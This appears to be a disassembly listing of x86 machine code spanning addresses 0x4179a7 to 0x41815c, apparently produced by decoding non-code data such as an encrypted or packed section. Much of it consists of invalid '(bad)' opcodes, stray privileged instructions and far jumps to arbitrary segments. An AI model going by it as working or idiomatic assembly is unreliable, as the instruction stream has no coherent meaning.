  4179a7:	cmc    
  4179a8:	div    DWORD PTR es:[edx+0x8]
  4179ac:	mov    eax,ds:0xd834475
  4179b1:	call   0x4f4:0xf725
  4179b8:	add    BYTE PTR [eax],al
  4179ba:	xor    al,0x7
  4179bc:	jmp    0xa46d:0x5685f49b
  4179c3:	int    0x1f
  4179c5:	arpl   WORD PTR [eax-0x72a4def1],di
  4179cb:	in     al,0xcc
  4179cd:	adc    eax,0x88e3701c
  4179d2:	mov    cl,0x9
  4179d4:	jnp    0x4179dc
  4179d6:	sub    esp,0x9050ab18
  4179dc:	push   ebx
  4179dd:	outs   dx,DWORD PTR ds:[esi]
  4179de:	(bad)  
  4179e0:	push   ss
  4179e1:	pushf  
  4179e2:	cwde   
  4179e3:	cli    
  4179e4:	mov    bl,0x1c
  4179e6:	xchg   ecx,eax
  4179e7:	mov    BYTE PTR [ecx+0x39],al
  4179ea:	xchg   ecx,eax
  4179eb:	imul   ebp,DWORD PTR [edi+edi*1],0x6d
  4179ef:	mov    ds:0xa887c6b3,al
  4179f4:	push   edx
  4179f5:	cwde   
  4179f6:	cwde   
  4179f7:	(bad)  
  4179f8:	fxtract 
  4179fa:	add    BYTE PTR [edx+0xab529ae],dl
  417a00:	pop    ecx
  417a01:	push   esi
  417a02:	arpl   di,si
  417a04:	sar    ecx,0xdd
  417a07:	adc    al,0xfb
  417a09:	mov    edx,0xf5b7b3d9
  417a0e:	sbb    eax,0x3cffc14b
  417a13:	cmp    esi,ecx
  417a15:	and    edi,DWORD PTR [eax-0x3eed5fd6]
  417a1b:	cs add edi,edi
  417a1e:	mov    esp,DWORD PTR [ebp-0xeccbe36]
  417a24:	test   esp,ebp
  417a26:	push   eax
  417a27:	ins    DWORD PTR es:[edi],dx
  417a28:	cmp    al,0x9c
  417a2a:	push   cs
  417a2b:	push   esp
  417a2c:	pop    esi
  417a2d:	xchg   ebx,eax
  417a2e:	sub    DWORD PTR [ebx+0x4cdf64c9],edi
  417a34:	add    eax,ebx
  417a36:	sbb    dl,BYTE PTR [edi]
  417a38:	scas   eax,DWORD PTR es:[edi]
  417a39:	lock in al,0xa0
  417a3c:	fsub   DWORD PTR ds:0x839c8a5f
  417a42:	and    eax,0x156a5c38
  417a47:	out    0x21,eax
  417a49:	add    al,0xc4
  417a4b:	adc    bh,ch
  417a4d:	jns    0x417ab1
  417a4f:	(bad)  
  417a50:	or     al,0x80
  417a52:	ins    DWORD PTR es:[edi],dx
  417a53:	or     al,0x7
  417a55:	mov    ebp,0xa63b6a4c
  417a5a:	test   ebx,edi
  417a5c:	or     ecx,DWORD PTR [edx-0x6b]
  417a5f:	xor    BYTE PTR [esi-0xd1ffb8d],ch
  417a65:	dec    edx
  417a66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a67:	cmc    
  417a68:	aam    0x18
  417a6a:	fnsave [esi]
  417a6c:	mov    dh,0x36
  417a6e:	(bad)
  417a71:	push   ss
  417a72:	xor    eax,0x96467cd
  417a77:	mov    esi,0xfc07c847
  417a7c:	push   ds
  417a7d:	(bad)  
  417a7e:	xor    ah,BYTE PTR [ebx]
  417a80:	pop    esi
  417a81:	into   
  417a82:	pop    es
  417a83:	inc    ecx
  417a84:	mov    dh,0xef
  417a86:	int3   
  417a87:	mov    ebx,0xd3bb9609
  417a8c:	pop    es
  417a8d:	mov    edx,0x1f395324
  417a92:	inc    esp
  417a93:	sbb    BYTE PTR [ecx],ch
  417a95:	mov    esi,0x4d7febc2
  417a9a:	shr    esp,0x3d
  417a9d:	xchg   ebx,eax
  417a9e:	popf   
  417a9f:	add    BYTE PTR [edx],ch
  417aa1:	and    cl,al
  417aa3:	cld    
  417aa4:	sub    al,0x2c
  417aa6:	hlt    
  417aa7:	int    0x4
  417aa9:	dec    eax
  417aaa:	lds    esi,FWORD PTR [eax+0x48]
  417aad:	pop    DWORD PTR [ebp+0x17]
  417ab0:	inc    esp
  417ab1:	dec    esi
  417ab2:	xor    al,0x7c
  417ab4:	add    al,0x8e
  417ab6:	cmp    DWORD PTR ds:0x4809fcde,esi
  417abc:	pop    bx
  417abe:	jns    0x417b1e
  417ac0:	aas    
  417ac1:	mov    ebp,0x2cf0160c
  417ac6:	fscale 
  417ac8:	xchg   edi,eax
  417ac9:	jns    0x417a77
  417acb:	outs   dx,BYTE PTR ds:[esi]
  417acc:	cmp    ebp,DWORD PTR [ebp+0x3]
  417acf:	shl    BYTE PTR [ecx],cl
  417ad1:	aaa    
  417ad2:	int    0x91
  417ad4:	dec    ecx
  417ad5:	repz imul edx,DWORD PTR [eax],0xffffffb3
  417ad9:	cmp    ah,BYTE PTR [esi]
  417adb:	and    bh,BYTE PTR [edi-0x2b]
  417ade:	lock cmp ebp,ebp
  417ae1:	ds test al,0xe
  417ae4:	push   0xffffff9f
  417ae6:	push   0xfeeb882a
  417aeb:	jns    0x417ae3
  417aed:	and    bl,BYTE PTR [edi+ebx*4-0x3a8e5dd6]
  417af4:	cmp    BYTE PTR [edx],dh
  417af6:	out    dx,al
  417af7:	lods   eax,DWORD PTR ds:[esi]
  417af8:	dec    ebx
  417af9:	mov    esp,DWORD PTR [ebp-0x4a728056]
  417aff:	into   
  417b00:	iret   
  417b01:	sub    BYTE PTR [edx+esi*1+0x3],al
  417b05:	mov    edx,0x109c9725
  417b0a:	mov    ah,0x85
  417b0c:	mov    ebx,0xb24163c2
  417b11:	ds stc 
  417b13:	test   eax,0x4c4c3dec
  417b18:	aad    0xa4
  417b1a:	or     DWORD PTR [eax+0x4b5f9f63],esp
  417b20:	hlt    
  417b21:	xchg   ecx,eax
  417b22:	mov    edi,ds
  417b24:	mov    al,cs:0xe49ddff9
  417b2a:	sub    BYTE PTR [ebx-0x20],bh
  417b2d:	repz mov esi,0x5ffc38ac
  417b33:	loop   0x417b7f
  417b35:	(bad)  
  417b37:	fld    DWORD PTR [eax]
  417b39:	mov    eax,0x10359dab
  417b3e:	jmp    0xed9a:0x39db24f0
  417b45:	inc    edx
  417b46:	(bad)  
  417b47:	retf   0x3d5f
  417b4a:	jb     0x417b5d
  417b4c:	aas    
  417b4d:	mov    esi,0x19ac8823
  417b52:	push   ebx
  417b53:	sti    
  417b54:	mov    edi,0x8b52d47a
  417b59:	sub    ch,BYTE PTR [esp]
  417b5c:	in     al,0x7a
  417b5e:	pop    ss
  417b5f:	dec    esp
  417b60:	or     edx,esp
  417b62:	in     eax,0x81
  417b64:	xor    bh,bl
  417b66:	imul   ebx,DWORD PTR [ecx-0x35],0xd45043ec
  417b6d:	bound  ebp,QWORD PTR [eax]
  417b6f:	sub    edx,DWORD PTR [edi]
  417b71:	jne    0x417ba4
  417b73:	mov    al,0xe2
  417b75:	sbb    ebp,ecx
  417b77:	pushf  
  417b78:	sbb    al,0x19
  417b7a:	retf   
  417b7b:	jg     0x417b91
  417b7d:	lea    eax,[ebx+0x684e576e]
  417b83:	or     BYTE PTR [edx],0x10
  417b86:	sub    al,ah
  417b88:	inc    edx
  417b89:	enter  0x4450,0x21
  417b8d:	add    DWORD PTR [ebp-0x2f2c4b54],ebx
  417b93:	in     al,0xad
  417b95:	nop
  417b96:	test   DWORD PTR [edi+0x19ddd36d],0xc3345a9f
  417ba0:	das    
  417ba1:	mov    cl,0x26
  417ba3:	or     al,ah
  417ba5:	push   bx
  417ba7:	out    0x2c,al
  417ba9:	jno    0x417b92
  417bab:	add    al,0xc5
  417bad:	nop
  417bae:	push   ebp
  417baf:	aas    
  417bb0:	jle    0x417bca
  417bb2:	out    dx,al
  417bb3:	ja     0x417ba2
  417bb5:	adc    DWORD PTR [edi-0x79],ecx
  417bb8:	or     BYTE PTR [ecx-0x692240dc],cl
  417bbe:	cmc    
  417bbf:	in     eax,0x62
  417bc1:	jns    0x417bc7
  417bc3:	sbb    dh,cl
  417bc5:	xchg   edx,eax
  417bc6:	xor    al,0x7f
  417bc8:	outs   dx,DWORD PTR ds:[esi]
  417bc9:	add    DWORD PTR [ecx-0x7b53d622],esi
  417bcf:	pop    edx
  417bd0:	shl    BYTE PTR [edi+0x8973c0e],1
  417bd6:	fwait
  417bd7:	jg     0x417bd2
  417bd9:	pusha  
  417bda:	xor    eax,0xb6d1d6af
  417bdf:	pop    ss
  417be0:	add    BYTE PTR [ebx-0x6cfd1bf8],ch
  417be6:	mov    bh,cl
  417be8:	dec    eax
  417be9:	push   ds
  417bea:	push   cs
  417beb:	mov    ch,0xcb
  417bed:	not    DWORD PTR [esi+0x72]
  417bf0:	mov    WORD PTR [ecx+0x2c459e00],?
  417bf6:	xor    BYTE PTR [ecx+edi*4-0x1d9c46dd],dl
  417bfd:	pop    ebp
  417bfe:	(bad)  
  417bff:	enter  0xdf23,0x55
  417c03:	leave  
  417c04:	push   es
  417c05:	dec    ecx
  417c06:	push   0xd5d6e92c
  417c0b:	lds    edi,FWORD PTR [ebp-0x6a4e0caa]
  417c11:	lock das 
  417c13:	inc    al
  417c15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c16:	lods   al,BYTE PTR ds:[esi]
  417c17:	sahf   
  417c18:	adc    eax,0xf01e5417
  417c1d:	ror    DWORD PTR [ebp+0x66],cl
  417c20:	sti    
  417c21:	mov    ?,WORD PTR [ebp-0x1cabcc0b]
  417c27:	jg     0x417c66
  417c29:	fidiv  WORD PTR [ebp+ecx*1+0x50078bc]
  417c30:	ins    BYTE PTR es:[edi],dx
  417c31:	push   ecx
  417c32:	scas   al,BYTE PTR es:[edi]
  417c33:	pop    ecx
  417c34:	or     al,0x87
  417c36:	pop    edi
  417c37:	dec    eax
  417c38:	in     al,dx
  417c39:	sub    al,0x16
  417c3b:	sub    cl,BYTE PTR [esi+0xa]
  417c3e:	xchg   DWORD PTR [ecx-0x4d6ad149],esp
  417c44:	xor    BYTE PTR [esi+0x18],dh
  417c47:	out    0x8d,al
  417c49:	iret   
  417c4a:	mov    ch,0xe6
  417c4c:	jb     0x417c97
  417c4e:	icebp  
  417c4f:	repz sbb DWORD PTR [ecx],esi
  417c52:	popf   
  417c53:	push   eax
  417c54:	jle    0x417c25
  417c56:	int3   
  417c57:	sub    eax,0xf43d6049
  417c5c:	gs or  bl,dl
  417c5f:	pop    ebx
  417c60:	cmp    BYTE PTR [ecx-0x4a1accc1],0x77
  417c67:	retf   
  417c68:	push   ds
  417c69:	mov    esp,esp
  417c6b:	icebp  
  417c6c:	pop    edi
  417c6d:	scas   eax,DWORD PTR es:[edi]
  417c6e:	sbb    BYTE PTR [eax+0x77],0xb7
  417c72:	rol    esi,1
  417c74:	mov    es,WORD PTR ds:0xa119ebba
  417c7a:	pop    esp
  417c7b:	pop    ss
  417c7c:	xchg   edi,eax
  417c7d:	and    BYTE PTR [ebx-0x35f73412],bl
  417c83:	popa   
  417c84:	jne    0x417c65
  417c86:	xchg   edx,eax
  417c87:	in     eax,0x7e
  417c89:	popf   
  417c8a:	fwait
  417c8b:	mov    cl,0xa1
  417c8d:	ss push ss
  417c8f:	lods   eax,DWORD PTR ds:[esi]
  417c90:	out    0x91,eax
  417c92:	ret    
  417c93:	and    dl,ch
  417c95:	mov    es,WORD PTR gs:[edi]
  417c98:	bound  ebp,QWORD PTR [eax]
  417c9a:	mov    ebx,0x555db7dd
  417c9f:	ret    
  417ca0:	mov    ch,0xc8
  417ca2:	test   eax,0x3d6b480e
  417ca7:	push   es
  417ca8:	dec    ebp
  417ca9:	sub    al,0x76
  417cab:	aaa    
  417cac:	jp     0x417d07
  417cae:	sub    eax,0xffffffad
  417cb1:	imul   esp,DWORD PTR [esi],0xffffff83
  417cb4:	pop    esi
  417cb5:	mov    edi,0xdebf03b2
  417cba:	jmp    0x417c93
  417cbc:	jmp    0x417d25
  417cbe:	out    0x4f,al
  417cc0:	xor    al,0x70
  417cc2:	test   ebp,0x51cf4fd4
  417cc8:	xchg   BYTE PTR [esi],bl
  417cca:	imul   esi,DWORD PTR [edi-0x59abad67],0xffffff83
  417cd1:	int    0x4
  417cd3:	sbb    al,0x18
  417cd5:	cmp    BYTE PTR [edx-0x69],0xc5
  417cd9:	aam    0x5f
  417cdb:	sub    al,0xf2
  417cdd:	je     0x417c8d
  417cdf:	add    DWORD PTR [edi-0x32],esi
  417ce2:	popa   
  417ce3:	jae    0x417ca3
  417ce5:	sub    DWORD PTR [edx+0x60],0x6602d1d4
  417cec:	and    eax,0x3a95ad77
  417cf1:	cs test ebp,ebp
  417cf4:	gs jne 0x417d69
  417cf7:	push   cs
  417cf8:	pushf  
  417cf9:	inc    edi
  417cfa:	cli    
  417cfb:	shl    bh,1
  417cfd:	aam    0x47
  417cff:	fs jbe 0x417d06
  417d02:	inc    edx
  417d03:	mov    eax,ds:0xf785cbb4
  417d08:	mov    al,0x97
  417d0a:	mov    esi,0x14dc03f5
  417d0f:	cmp    eax,0x7ad54fc6
  417d14:	pushw  0xd0d7
  417d18:	outs   dx,BYTE PTR ds:[esi]
  417d19:	sub    ah,al
  417d1b:	fild   WORD PTR ds:0x6dac5cd9
  417d21:	scas   eax,DWORD PTR es:[edi]
  417d22:	xchg   edi,eax
  417d23:	inc    edx
  417d24:	cdq    
  417d25:	call   0x484962b8
  417d2a:	sub    edx,edi
  417d2c:	div    BYTE PTR [ecx]
  417d2e:	div    DWORD PTR [ebp-0x1]
  417d31:	cli    
  417d32:	mov    ch,0x67
  417d34:	rol    BYTE PTR gs:[ebp-0x5],0x62
  417d39:	dec    esi
  417d3a:	in     al,dx
  417d3b:	xchg   ebx,eax
  417d3c:	dec    eax
  417d3d:	add    DWORD PTR [edi],ebp
  417d3f:	fadd   DWORD PTR [eax]
  417d41:	scas   al,BYTE PTR es:[edi]
  417d42:	jmp    0x417db9
  417d44:	or     DWORD PTR es:[eax],esp
  417d47:	ret    
  417d48:	push   ebp
  417d49:	jns    0x417d33
  417d4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d4c:	adc    DWORD PTR [ebp-0x168709b2],esp
  417d52:	int    0x1c
  417d54:	(bad)  
  417d55:	sbb    BYTE PTR [eax-0x46],bl
  417d58:	pop    esi
  417d59:	out    0x5e,al
  417d5b:	js     0x417d44
  417d5d:	les    eax,FWORD PTR [esi+0x71]
  417d60:	jno    0x417d6d
  417d62:	mov    BYTE PTR [ecx],ch
  417d64:	dec    ebp
  417d65:	aaa    
  417d66:	or     esi,ebp
  417d68:	adc    DWORD PTR [edi-0x4624c2e],esp
  417d6e:	jge    0x417d40
  417d70:	dec    esp
  417d72:	or     eax,0x1110617a
  417d77:	sbb    BYTE PTR [ebx],cl
  417d79:	adc    ebp,ebp
  417d7b:	and    DWORD PTR [eax],edx
  417d7d:	cmp    DWORD PTR [edx-0x44f8aadb],0x51
  417d84:	xor    eax,0x3f012a47
  417d89:	inc    esi
  417d8a:	mov    edi,ebp
  417d8c:	jo     0x417d85
  417d8e:	hlt    
  417d8f:	xorps  xmm1,XMMWORD PTR [ebx+0x1d294c7]
  417d96:	into   
  417d97:	mov    ah,0xfd
  417d99:	jl     0x417d8b
  417d9b:	cld    
  417d9c:	dec    ebp
  417d9d:	and    DWORD PTR [esi+0x7ce06e56],ebp
  417da3:	inc    esi
  417da4:	push   ebx
  417da5:	cmc    
  417da6:	repnz es mov cl,0x99
  417daa:	add    ebp,DWORD PTR [ebx]
  417dac:	inc    edx
  417dad:	test   BYTE PTR [eax-0xde1d339],ah
  417db3:	pop    ebx
  417db4:	mov    esi,0xd4f0d5e
  417db9:	leave  
  417dba:	fsub   st(1),st
  417dbc:	shl    DWORD PTR [ecx+0x8],1
  417dbf:	fisttp DWORD PTR [edi+0x1c]
  417dc2:	push   esi
  417dc3:	pop    ds
  417dc4:	or     cl,BYTE PTR [esi+0x20]
  417dc7:	xlat   BYTE PTR ds:[ebx]
  417dc8:	fmul   DWORD PTR [edx]
  417dca:	jne    0x417e0f
  417dcc:	imul   esi,DWORD PTR [edx+0x65],0xbdf2c25a
  417dd3:	and    DWORD PTR [esi-0x74a78d43],edx
  417dd9:	mov    ebx,0x7f8b9cfc
  417dde:	mov    dl,0x76
  417de0:	ss retf 
  417de2:	inc    esi
  417de3:	popf   
  417de4:	inc    esp
  417de5:	pop    ss
  417de6:	add    DWORD PTR [di-0x66],esi
  417dea:	sub    al,0x45
  417dec:	push   ebx
  417ded:	mov    dl,0xc1
  417def:	loop   0x417dd8
  417df1:	or     bl,BYTE PTR [esi]
  417df3:	popa   
  417df4:	add    BYTE PTR [ebp-0x7de38e22],bl
  417dfa:	neg    DWORD PTR [ecx-0x10]
  417dfd:	cmp    al,BYTE PTR [ecx+edx*4]
  417e00:	inc    edi
  417e01:	(bad)
  417e05:	aam    0x64
  417e07:	leave  
  417e08:	adc    eax,0x35a946c1
  417e0d:	ret    0xcab4
  417e10:	enter  0x2975,0x8d
  417e14:	cld    
  417e15:	jnp    0x417e95
  417e17:	hlt    
  417e18:	push   0x93bb7225
  417e1d:	and    bh,BYTE PTR [edi-0x4c]
  417e20:	mov    ds:0x4bbe639b,al
  417e25:	leave  
  417e26:	mov    ch,0x3d
  417e28:	or     bl,ah
  417e2a:	daa    
  417e2b:	push   ecx
  417e2c:	push   0x58
  417e2e:	lods   al,BYTE PTR ds:[esi]
  417e2f:	inc    ebx
  417e30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e31:	jo     0x417e75
  417e33:	sahf   
  417e34:	das    
  417e35:	push   esp
  417e36:	push   0xfffffff5
  417e38:	jbe    0x417eb9
  417e3a:	aam    0x3b
  417e3c:	xor    edi,DWORD PTR [ecx-0x2c9856a4]
  417e42:	adc    bl,al
  417e44:	pop    eax
  417e45:	imul   ebx,DWORD PTR [ecx-0x4eaf9a14],0xa
  417e4c:	jmp    0xdd86:0x2a3cfc0b
  417e53:	les    eax,FWORD PTR [esi+esi*4+0x7755ddab]
  417e5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e5b:	push   esi
  417e5c:	mov    ecx,0x4299c9f1
  417e61:	mov    edx,0x4d35a4ad
  417e66:	in     eax,dx
  417e67:	and    ebx,DWORD PTR [ebp+0x48]
  417e6a:	jg     0x417e49
  417e6c:	es (bad) 
  417e6f:	pop    esi
  417e70:	mov    ds:0xcf6ead77,eax
  417e75:	mov    WORD PTR [eax],ss
  417e77:	push   0x178a58a0
  417e7c:	call   0x5820:0x230939ff
  417e83:	fstp   QWORD PTR gs:[edx-0x14]
  417e87:	fld    st(7)
  417e89:	dec    ecx
  417e8a:	push   ecx
  417e8b:	pop    ss
  417e8c:	mov    dh,0x15
  417e8e:	cmp    eax,0xc6e0930b
  417e93:	(bad)  
  417e95:	sub    ecx,esp
  417e97:	cmp    bl,BYTE PTR [ecx-0x54f7a6b9]
  417e9d:	leave  
  417e9e:	or     BYTE PTR [ecx],ch
  417ea0:	(bad)  
  417ea1:	jecxz  0x417f0f
  417ea3:	das    
  417ea4:	cmp    DWORD PTR [edi],esp
  417ea6:	cld    
  417ea7:	iret   
  417ea8:	sahf   
  417ea9:	sub    al,0x92
  417eab:	in     eax,0xc6
  417ead:	pop    ds
  417eae:	add    BYTE PTR [eax],al
  417eb0:	add    BYTE PTR [eax],al
  417eb2:	ret    0x939e
  417eb5:	inc    edi
  417eb6:	fisttp WORD PTR [edi-0x2a]
  417eb9:	lahf   
  417eba:	int    0x45
  417ebc:	push   eax
  417ebd:	cmove  esp,DWORD PTR [eax]
  417ec0:	cli    
  417ec1:	xchg   edx,eax
  417ec2:	sbb    esp,edi
  417ec4:	add    BYTE PTR [eax],al
  417ec6:	hlt    
  417ec7:	add    al,0x0
  417ec9:	add    BYTE PTR [ebp+ebx*8+0x5d4c4f4f],dh
  417ed0:	jp     0x417e60
  417ed2:	aas    
  417ed3:	jp     0x417eb1
  417ed5:	adc    al,0x4f
  417ed7:	ret    0xf84c
  417eda:	adc    edi,DWORD PTR [esi]
  417edc:	imul   DWORD PTR [ecx-0x48]
  417edf:	pop    esi
  417ee0:	std    
  417ee1:	and    dl,dh
  417ee3:	xchg   esi,eax
  417ee4:	aas    
  417ee5:	loopne 0x417ec8
  417ee7:	pop    ds
  417ee8:	(bad)  
  417ee9:	xchg   esi,eax
  417eea:	es sbb al,0x57
  417eed:	hlt    
  417eee:	mov    edx,0x18ed5dd6
  417ef3:	xchg   ebp,eax
  417ef4:	dec    ebp
  417ef5:	dec    edx
  417ef6:	xlat   BYTE PTR ds:[ebx]
  417ef7:	test   BYTE PTR [ecx],dl
  417ef9:	mov    ecx,0xd98d6b38
  417efe:	jmp    0x3959:0xbb519dc8
  417f05:	into   
  417f06:	iret   
  417f07:	and    al,0xe1
  417f09:	dec    ebp
  417f0a:	imul   ecx,DWORD PTR [ecx+0x6e],0x5
  417f0e:	pop    ss
  417f0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f10:	pop    eax
  417f11:	mov    ebx,esp
  417f13:	cmp    al,0xd6
  417f15:	mov    ds:0x14b6d00d,al
  417f1a:	push   ebx
  417f1b:	push   edi
  417f1c:	sub    BYTE PTR cs:[ecx],al
  417f1f:	fcomi  st,st(7)
  417f21:	test   al,0x1b
  417f23:	dec    ecx
  417f24:	call   0x25969669
  417f29:	and    eax,0x4d6e2457
  417f2e:	or     eax,0xe81b1313
  417f33:	pop    esi
  417f34:	cli    
  417f35:	mov    edx,0x7373dd36
  417f3a:	mov    edx,ds
  417f3c:	and    al,0x6a
  417f3e:	loopne 0x417ed2
  417f40:	call   0x965f1700
  417f45:	add    al,0x8a
  417f47:	pop    ds
  417f48:	mov    edx,ss
  417f4a:	xchg   edi,eax
  417f4b:	sahf   
  417f4c:	rol    DWORD PTR [ecx+ebx*4],0xf3
  417f50:	stos   DWORD PTR es:[edi],eax
  417f51:	jb     0x417f03
  417f53:	imul   ebx,eax,0xc492cdab
  417f59:	mov    cl,BYTE PTR [esi-0x33]
  417f5c:	cdq    
  417f5d:	xor    al,0x37
  417f5f:	add    BYTE PTR [esi],al
  417f61:	call   0x98979bcf
  417f66:	shl    DWORD PTR [ebp-0x707caae9],0xb7
  417f6d:	ins    BYTE PTR es:[edi],dx
  417f6e:	mov    ebx,0x2e992b1e
  417f73:	or     bl,ch
  417f75:	stc    
  417f76:	dec    dh
  417f78:	pop    eax
  417f79:	sub    DWORD PTR [ecx+0x2e498d54],ecx
  417f7f:	sub    al,0xc7
  417f81:	cli    
  417f82:	pop    edx
  417f83:	fcmovnu st,st(2)
  417f85:	push   ds
  417f86:	nop
  417f87:	inc    ebx
  417f88:	fidivr WORD PTR [ecx]
  417f8a:	xchg   ebx,eax
  417f8b:	push   0xffffffa4
  417f8d:	xor    ch,bl
  417f8f:	lods   eax,DWORD PTR ds:[esi]
  417f90:	shl    edi,0x95
  417f93:	mov    ds:0x1f1882be,eax
  417f98:	add    ah,BYTE PTR [ebp-0x21]
  417f9b:	jg     0x417f4b
  417f9d:	dec    esi
  417f9e:	call   0x118c:0xdfb4f2b2
  417fa5:	jne    0x417ffe
  417fa7:	mov    ch,0x8
  417fa9:	inc    esp
  417faa:	sar    ebp,cl
  417fac:	inc    ecx
  417fad:	xchg   ebp,eax
  417fae:	dec    eax
  417faf:	leave  
  417fb0:	cmc    
  417fb1:	adc    al,0xd9
  417fb3:	cmp    BYTE PTR [esi],bh
  417fb5:	add    al,0x25
  417fb7:	pop    ds
  417fb8:	pop    ds
  417fb9:	std    
  417fba:	(bad)  
  417fbb:	cmp    eax,0x23d49cdb
  417fc0:	enter  0x7ddd,0xc5
  417fc4:	mov    BYTE PTR [edi+ecx*8-0xa5ddd31],ah
  417fcb:	jae    0x417fb7
  417fcd:	and    ah,0x4a
  417fd0:	outs   dx,DWORD PTR ds:[esi]
  417fd1:	push   ds
  417fd2:	icebp  
  417fd3:	outs   dx,BYTE PTR ds:[esi]
  417fd4:	mov    ch,0x19
  417fd6:	sbb    BYTE PTR [ebx+ebx*4+0x0],al
  417fda:	ss icebp 
  417fdc:	ror    BYTE PTR [edi],1
  417fde:	loop   0x417f65
  417fe0:	je     0x417fa3
  417fe2:	pop    ss
  417fe3:	pop    ecx
  417fe4:	adc    dh,cl
  417fe6:	ficomp WORD PTR [ecx]
  417fe8:	pop    ebp
  417fe9:	xchg   ebx,ecx
  417feb:	ds inc edx
  417fed:	(bad)
  417ff0:	popa   
  417ff1:	dec    ebp
  417ff2:	pusha  
  417ff3:	fadd   QWORD PTR [ecx]
  417ff5:	inc    esp
  417ff6:	push   cs
  417ff7:	pusha  
  417ff8:	fwait
  417ff9:	jb     0x417f8b
  417ffb:	xor    eax,0xe431e16
  418000:	test   BYTE PTR ds:0x5ff38ff2,ah
  418006:	shr    DWORD PTR [ebx],1
  418008:	test   al,0xdb
  41800a:	imul   esp,DWORD PTR [ebp-0x2d],0x6e
  41800e:	ins    DWORD PTR es:[edi],dx
  41800f:	sbb    dh,BYTE PTR [edx]
  418011:	sar    DWORD PTR [esi],0x71
  418014:	cmp    BYTE PTR [esi-0x4d409b16],0x4e
  41801b:	pop    edx
  41801c:	mov    ecx,0xa34c288a
  418021:	loopne 0x418012
  418023:	nop
  418024:	sbb    eax,edi
  418026:	pop    esp
  418027:	loope  0x417fc6
  418029:	sbb    DWORD PTR [eax],esp
  41802b:	sub    eax,0x1cfa542
  418030:	popa   
  418031:	jmp    0xe33d:0xb83fc8fd
  418038:	adc    edx,DWORD PTR ss:[edi-0x3883ea2a]
  41803f:	fcmovbe st,st(1)
  418041:	mov    ah,0xee
  418043:	and    BYTE PTR [edi-0x17],ah
  418046:	adc    dh,BYTE PTR [ebx]
  418048:	out    0x39,al
  41804a:	aad    0x9a
  41804c:	push   0xf
  41804e:	cmp    eax,ebx
  418050:	imul   ebp,esi,0xffffffa1
  418053:	jo     0x41805f
  418055:	push   ebp
  418056:	xor    bl,BYTE PTR [ebx+ebp*8]
  418059:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41805a:	icebp  
  41805b:	adc    bl,BYTE PTR [esi]
  41805d:	and    DWORD PTR [eax],0x7090d31f
  418063:	(bad)  
  418064:	mov    esi,0x74511f15
  418069:	inc    esi
  41806a:	aas    
  41806b:	pusha  
  41806c:	mov    ecx,0x3422de78
  418071:	scas   al,BYTE PTR es:[edi]
  418072:	sar    BYTE PTR ss:[ebp-0x34],0xf5
  418077:	jg     0x418022
  418079:	iret   
  41807a:	ins    DWORD PTR es:[edi],dx
  41807b:	test   eax,0x9b4ec9e4
  418080:	fbstp  TBYTE PTR [edx-0x3e]
  418083:	and    bl,BYTE PTR [ecx]
  418085:	idiv   DWORD PTR [ecx-0x65ec682d]
  41808b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41808c:	cmp    eax,0xe61300e9
  418091:	(bad)  
  418092:	outs   dx,DWORD PTR ds:[esi]
  418093:	fwait
  418094:	sub    eax,edx
  418096:	retf   
  418097:	cli    
  418098:	(bad)  
  418099:	loope  0x418111
  41809b:	jae    0x4180d1
  41809d:	imul   esi,DWORD PTR [eax+0x391d9cc4],0xffffffdd
  4180a4:	sub    dh,BYTE PTR [edi+0x4a]
  4180a7:	push   es
  4180a8:	dec    esi
  4180a9:	das    
  4180aa:	or     dh,BYTE PTR [edi+0x12ef7d7c]
  4180b0:	mov    dl,0x58
  4180b2:	sub    ebp,ecx
  4180b4:	mov    ebx,0x102e5a59
  4180b9:	cmp    esp,DWORD PTR [edi+0x16]
  4180bc:	sbb    BYTE PTR [edi-0x67],0x16
  4180c0:	xchg   esi,eax
  4180c1:	fld    TBYTE PTR [ecx+0x5ada7ac7]
  4180c7:	pop    DWORD PTR [edi-0x1a865e8e]
  4180cd:	add    DWORD PTR [ebx-0x54efd7c0],esp
  4180d3:	pop    ss
  4180d4:	cmp    BYTE PTR [esi+0x4a444533],bh
  4180da:	cli    
  4180db:	mov    dh,0x13
  4180dd:	cmp    dl,BYTE PTR [ebx]
  4180df:	cli    
  4180e0:	or     BYTE PTR es:[edi-0x6bea95f4],ch
  4180e7:	repz cwde 
  4180e9:	push   cs
  4180ea:	clc    
  4180eb:	push   ss
  4180ec:	and    ebx,ebx
  4180ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180ef:	js     0x418139
  4180f1:	jnp    0x418126
  4180f3:	imul   eax,DWORD PTR [edx+0x5b],0x8b2a4b0d
  4180fa:	add    BYTE PTR [eax-0xcfccac7],cl
  418100:	je     0x4180c8
  418102:	hlt    
  418103:	js     0x4180c5
  418105:	mov    cs,WORD PTR [edi-0x500405cb]
  41810b:	bound  esp,QWORD PTR [eax+0x4698318a]
  418111:	push   0xea1b6d46
  418116:	lahf   
  418117:	cmp    ecx,DWORD PTR [edi]
  418119:	in     eax,dx
  41811a:	mov    ecx,0xbe10244d
  41811f:	push   edx
  418120:	adc    esp,DWORD PTR [ebx]
  418122:	sub    eax,0x4a00f54
  418127:	inc    ebx
  418128:	dec    esi
  418129:	inc    ebp
  41812a:	pop    ebx
  41812b:	aam    0xe7
  41812d:	stos   BYTE PTR es:[edi],al
  41812e:	push   edi
  41812f:	fisubr WORD PTR [ebx]
  418131:	stos   DWORD PTR es:[edi],eax
  418132:	ror    dh,cl
  418134:	add    BYTE PTR ds:0x2d52cde1,dl
  41813a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41813b:	mov    bh,0x8a
  41813d:	inc    ecx
  41813e:	lea    esi,[ecx-0x10]
  418141:	xor    DWORD PTR [eax+ebp*4+0x3dcad3e],esp
  418148:	lds    edx,FWORD PTR [esi]
  41814a:	push   ebx
  41814b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41814c:	(bad)  
  41814d:	mov    esp,0x5d6072d2
  418152:	sub    BYTE PTR [esi],0xe9
  418155:	xor    ecx,edi
  418157:	sbb    eax,0xe4fc1288
  41815c:	push   eax
